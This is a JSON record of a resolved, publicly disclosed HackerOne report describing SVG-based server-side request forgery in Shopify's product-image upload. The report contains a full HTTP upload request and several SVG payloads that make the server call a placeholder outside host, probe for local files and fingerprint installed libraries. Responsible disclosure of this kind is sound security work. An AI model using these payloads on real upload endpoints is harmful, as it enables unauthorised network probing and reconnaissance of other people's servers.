{
  "id": 223203,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjMyMDM=",
  "url": "https://hackerone.com/reports/223203",
  "title": "SVG Server Side Request Forgery (SSRF)",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2017-04-23T14:43:15.224Z",
  "submitted_at": "2017-04-23T14:43:15.224Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "floyd",
    "url": "/floyd",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/111/469/c180556a9581571521f1f7fad2da4776fc9fa9c6_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-09-22T09:09:19.529Z",
  "bug_reporter_agreed_on_going_public_at": "2017-09-22T09:09:19.442Z",
  "team_member_agreed_on_going_public_at": "2017-07-19T13:34:36.488Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I found an issue which seems to be regression of the following issue: https://hackerone.com/reports/97501 . It seems your input validaton is not sufficient and the file is getting processed before your implemented check for valid file types.\n\nWhen adding a new product in the store, images for the product can be uploaded. When modifying the HTTP request that is sent, an attacker can do Server Side Request Forgery. The attacker simply has to specify a filename ending in .png, but use Content-Type image/svg+xml and the file content as well an SVG file.\n\nThe following requests leads to an DNS and HTTP interaction with <EXAMPLE_SERVER>, a placeholder for any server on the Internet:\n\n```\nPOST /admin/products/9577763394/images.json HTTP/1.1\nHost: 667667.myshopify.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nX-CSRF-Token: ca/m3aW88KsRSpDmudAHJrJBPrXdClc4T/D88ZltUf6E0YUeKneGI5CZtDJFo6wHg+EY+Q4h0uPU8rqnmm/Ydw==\nX-Requested-With: XMLHttpRequest\nContent-Length: 671\nContent-Type: multipart/form-data; boundary=---------------------------1184233411771235065729422741\nCookie: <REDACTED>\nConnection: close\n\n-----------------------------1184233411771235065729422741\nContent-Disposition: form-data; name=\"image[attachment]\"; filename=\"NagKSvgXlink2.png\"\nContent-Type: image/svg+xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?><svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\"><image height=\"200\" width=\"200\" xlink:href=\"http://<EXAMPLE_SERVER>/image.jpeg\" /></svg>\n-----------------------------1184233411771235065729422741\nContent-Disposition: form-data; name=\"image[alt]\"\n\n\n-----------------------------1184233411771235065729422741--\n```\n\nAlthough the Shopify server responds with a HTTP 422 message, the interaction takes place with <EXAMPLE_SERVER>:\n\n```\nHTTP/1.1 422 Unprocessable Entity\nServer: nginx\nDate: Fri, 21 Apr 2017 11:17:02 GMT\nContent-Type: application/json; charset=utf-8\nConnection: close\nReferrer-Policy: origin-when-cross-origin\nX-Frame-Options: DENY\nX-ShopId: 19430493\nX-ShardId: 1\nX-Stats-UserId: 110274114\nCache-Control: no-cache, no-store\nSet-Cookie: request_method=POST; path=/\nContent-Security-Policy: default-src 'self' data: blob: 'unsafe-inline' 'unsafe-eval' https://* shopify-pos://*; child-src 'self' https://* shopify-pos://*; connect-src 'self' wss://* https://*; script-src https://cdn.shopify.com https://checkout.shopifycs.com https://js-agent.newrelic.com https://bam.nr-data.net https://dme0ih8comzn4.cloudfront.net https://api.stripe.com https://mpsnare.iesnare.com https://appcenter.intuit.com https://www.paypal.com https://stats.g.doubleclick.net https://www.google-analytics.com https://visitors.shopify.com https://v.shopify.com https://widget.intercom.io https://js.intercomcdn.com 'self' 'unsafe-inline' 'unsafe-eval'; upgrade-insecure-requests; report-uri /csp-report?source%5Baction%5D=create&source%5Bapp%5D=Shopify&source%5Bcontroller%5D=admin%2Fproduct_images&source%5Bsection%5D=admin&source%5Buuid%5D=834e8c11-d80b-4d00-a213-78619aebe696\nX-Content-Type-Options: nosniff\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nX-XSS-Protection: 1; mode=block; report=/xss-report?source%5Baction%5D=create&source%5Bapp%5D=Shopify&source%5Bcontroller%5D=admin%2Fproduct_images&source%5Bsection%5D=admin&source%5Buuid%5D=834e8c11-d80b-4d00-a213-78619aebe696\nX-Dc: ash,chi2\nX-Request-ID: 834e8c11-d80b-4d00-a213-78619aebe696\nContent-Length: 109\n\n{\"errors\":{\"image\":[\"The uploaded image is corrupt and cannot be processed. Please try a different image.\"]}}\n```\n\nThe interaction with <EXAMPLE_SERVER> for HTTP is:\n\n```\nGET /image.jpeg HTTP/1.0\nHost: <EXAMPLE_SERVER>\nAccept-Encoding: gzip \n```\n\nTo further analyse the issue, let's only talk about the SVG file content in the request:\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\">\n<image height=\"200\" width=\"200\" xlink:href=\"http://<EXAMPLE_SERVER>/image.jpeg\" />\n</svg>\n```\n\n\nA couple of facts:\n- When changing the `http://<EXAMPLE_SERVER>/image.jpeg` part to other protocols, only `http://` and `ftp://` lead to interaction with a server on the Internet. No other protocol on the following list does: https://www.w3.org/wiki/UriSchemes . \n- I tried to connect with the HTTP and FTP protocol to all 65535 TCP ports on my server. Shopify seems to have outbound filters on only one TCP port, 113. On all other ports I got a TCP SYN packet with both protocols. Often companies detect this kind of port scan from their network hosts, I don't know if you did.\n- The parser doesn't mind a static entity:\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE testingxxe [ <!ENTITY xml \"eXtensible Markup Language\"> ]>\n<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\">\n<image height=\"30\" width=\"30\" xlink:href=\"http://<EXAMPLE_SERVER>/image.jpg\" />\n<text x=\"0\" y=\"20\" font-size=\"20\">&xml;</text>\n</svg>\n```\n- The \"a billion laughs\" attack - see https://en.wikipedia.org/wiki/Billion_laughs - is probably possible as static entities are allowed, but DoS is not in the scope of your bug bounty program.\n- However, the parser *doesn't* like SYSTEM Entities, we can *not* specify a different DTD file, add SYSTEM entities or any other XXE attack.\n\nBut we can use two image references and as long as the first URL returns a valid image, the second one is requested as well:\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\">\n<image height=\"30\" width=\"30\" xlink:href=\"http://<EXAMPLE_SERVER>:81/example.png\" />\n<image height=\"30\" width=\"30\" xlink:href=\"http://<EXAMPLE_SERVER>:999/example.png\" />\n<text x=\"0\" y=\"20\" font-size=\"20\">test</text>\n</svg>\n```\n\nThis results in a Is-Picture-Present-Oracle. By sending a local path first we can find out if a file that includes a picture is present on the file system. Because we get an interaction for the following SVG, we know the picture /lib/plymouth/ubuntu_logo.png is present on the system (this does *not* work with non-image files like /etc/passwd):\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\">\n<image height=\"30\" width=\"30\" xlink:href=\"/lib/plymouth/ubuntu_logo.png\" />\n<image height=\"30\" width=\"30\" xlink:href=\"http://<EXAMPLE_SERVER>:999/example.png\" />\n<text x=\"0\" y=\"20\" font-size=\"20\">test</text>\n</svg>\n```\n\nThe following pictures allow us to fingerprint the versions of libraries installed on your server (these three files are present on your servers):\n- /usr/share/doc/libpng12-dev/examples/pngtest.png (you have libpng12-dev installed, etc.)\n- /usr/share/doc/libfreetype6/tutorial/metrics.png \n- /usr/share/doc/libexpat1-dev/expat.html/expat.png\n\n",
  "bounty_amount": "500.0",
  "formatted_bounty": "$500",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 69,
  "voters": [
    "rootz491",
    "cxzer0",
    "m4t35z",
    "rhynorater",
    "drsniper",
    "sp1d3rs",
    "un4gi",
    "nirvana_msu",
    "sameerphad72",
    "jub0bs",
    "and 59 more..."
  ],
  "severity": {
    "rating": "low",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
